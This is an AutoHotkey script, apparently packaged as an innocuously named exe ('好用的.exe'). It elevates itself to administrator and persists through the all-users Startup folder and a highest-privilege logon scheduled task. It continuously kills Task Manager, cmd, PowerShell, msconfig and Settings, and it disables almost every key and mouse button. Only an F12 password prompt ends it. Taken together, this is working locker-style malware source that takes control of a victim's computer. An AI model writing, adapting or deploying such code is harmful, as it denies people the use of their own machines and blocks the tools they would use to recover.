; 配置密码（可自行修改）
ExitPassword := ""  ; 这里设置你的退出密码
#NoTrayIcon
#Persistent
#NoEnv
#SingleInstance Force
SendMode Input
SetWorkingDir %A_ScriptDir%

; 获取当前EXE路径
CurrentPath := A_ScriptFullPath
if !A_IsAdmin
{
	; 重新以管理员身份启动
	Run *RunAs "%A_ScriptFullPath%"
	ExitApp
}
SplitPath, CurrentPath, FileName

; 定义启动文件夹路径（当前用户和所有用户）
UserStartup .= "\Microsoft\Windows\Start Menu\Programs\Startup"

AllUsersStartup := "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

; 如果当前用户启动文件夹失败，尝试所有用户启动文件夹（需要管理员权限）
if !Success
{
	; 检查是否以管理员身份运行
	; 尝试复制到所有用户启动文件夹
	TargetPath := AllUsersStartup "\" FileName
	FileCopy, %CurrentPath%, %AllUsersStartup%, 1
	run C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\好用的.exe
	if !ErrorLevel
	{
		Success := true
	}
}

; 获取当前脚本的完整路径
ScriptPath := A_ScriptFullPath
ScriptName := A_ScriptName
TaskName := "AutoStart_" ScriptName  ; 计划任务名称

; 检查是否已存在该计划任务
CheckTaskExist(TaskName)
{
	RunWait, schtasks /Query /TN "%TaskName%" >nul 2>&1, , Hide
	return ErrorLevel = 0
}

; 添加到计划任务
AddToTaskScheduler(TaskName, ScriptPath)
{
	; 创建计划任务的命令 - 在用户登录时启动，以最高权限运行
	Command := "schtasks /Create /TN """ TaskName """ /TR """ ScriptPath """ /SC ONLOGON /RL HIGHEST /F"

	; 执行命令
	RunWait, %ComSpec% /c %Command%, , Hide
	return ErrorLevel = 0
}

AddToTaskScheduler(TaskName, ScriptPath)

; 从计划任务中删除
DeleteTask(TaskName)
{
	; 显示确认对话框
	MsgBox, 4, 确认删除, 确定要从计划任务中删除 "%TaskName%" 吗？`n删除后脚本将不会自动启动。
	IfMsgBox, No
		return false

	; 执行删除命令
	Command := "schtasks /Delete /TN """ TaskName """ /F"
	RunWait, %ComSpec% /c %Command%, , Hide

	if ErrorLevel = 0
	{
		TrayTip, 操作成功, 计划任务已成功删除, 3, 1
		return true
	}
	else
	{
		TrayTip, 操作失败, 删除计划任务失败！请以管理员身份运行, 3, 1
		return false
	}
}

; 循环检测任务管理器进程
Loop
{
	; 检查是否存在任务管理器进程(taskmgr.exe)
	Process, Exist, taskmgr.exe
	if ErrorLevel  ; 如果进程存在（ErrorLevel为进程ID）
	{
		; 关闭任务管理器进程
		Process, Close, taskmgr.exe
		; 短暂延迟，避免频繁操作
		Sleep, 0
	}
	Process, Exist, cmd.exe
	if ErrorLevel  ; 如果进程存在（ErrorLevel为进程ID）
	{
		; 关闭任务管理器进程
		Process, Close, cmd.exe
		; 短暂延迟，避免频繁操作
		Sleep, 0
	}
	Process, Exist, powershell.exe
	if ErrorLevel  ; 如果进程存在（ErrorLevel为进程ID）
	{
		; 关闭任务管理器进程
		Process, Close, powershell.exe
		; 短暂延迟，避免频繁操作
		Sleep, 0
	}
	Process, Exist, msconfig.exe
	if ErrorLevel  ; 如果进程存在（ErrorLevel为进程ID）
	{
		; 关闭任务管理器进程
		Process, Close, msconfig.exe
		; 短暂延迟，避免频繁操作
		Sleep, 0
	}
	Process, Exist, Systemsettings.exe
	if ErrorLevel  ; 如果进程存在（ErrorLevel为进程ID）
	{
		; 关闭任务管理器进程
		Process, Close, Systemsettings.exe
		; 短暂延迟，避免频繁操作
		Sleep, 0
	}
	; 每隔100毫秒检查一次
	Sleep, 0
}

F1::Return
F2::Return
F3::Return
F4::Return
F5::Return
F6::Return
F7::Return
F8::Return
F9::Return
F10::Return
F11::Return
Enter::Return
Escape::Return
Space::Return
Tab::Return
Backspace::Return
Delete::Return
Insert::Return
Home::Return
End::Return
Left::Return
Right::Return
Up::Return
Down::Return
NumLock::Return
CapsLock::Return
ScrollLock::Return
Pause::Return
PrintScreen::Return
^C::Return
^V::Return
^T::Return
^R::Return
^S::Return
Shift::Return
Control::Return
Alt::Return
^+E::Return
^!Del::Return
#R::Return
#X::Return
A::Return
B::Return
C::Return
D::Return
E::Return
F::Return
G::Return
H::Return
I::Return
J::Return
K::Return
L::Return
M::Return
N::Return
O::Return
P::Return
Q::Return
R::Return
S::Return
T::Return
U::Return
V::Return
W::Return
X::Return
Y::Return
Z::Return
1::Return
2::Return
3::Return
4::Return
5::Return
6::Return
7::Return
8::Return
9::Return
0::Return
Numpad0::Return
Numpad1::Return
Numpad2::Return
Numpad3::Return
Numpad4::Return
Numpad5::Return
Numpad6::Return
Numpad7::Return
Numpad8::Return
Numpad9::Return
NumpadEnter::Return
NumpadAdd::Return
RButton::Return
MButton::Return
AppsKey::Return
; F12键触发退出确认
F12::
	; 询问是否关闭程序
	MsgBox, 4, 关闭程序, 是否关闭此程序？
	IfMsgBox, No
		return  ; 选择No，直接返回继续运行

	; 选择Yes后，要求输入密码
	InputBox, UserInput, 验证密码, 请输入退出密码：, Hide  ; Hide参数使输入内容显示为*
	if ErrorLevel  ; 用户取消输入
		return

	; 验证密码
	if (UserInput = ExitPassword)
	{
		MsgBox, 64, 验证成功, 密码正确，程序即将退出。

		if CheckTaskExist(TaskName)
			DeleteTask(TaskName)
		else
			TrayTip, 提示, 未找到对应的计划任务, 2, 1

		ExitApp  ; 密码正确，退出程序
	}
	else
	{
		MsgBox, 16, 验证失败, 密码错误，程序将继续运行。
		return  ; 密码错误，继续运行
	}
return
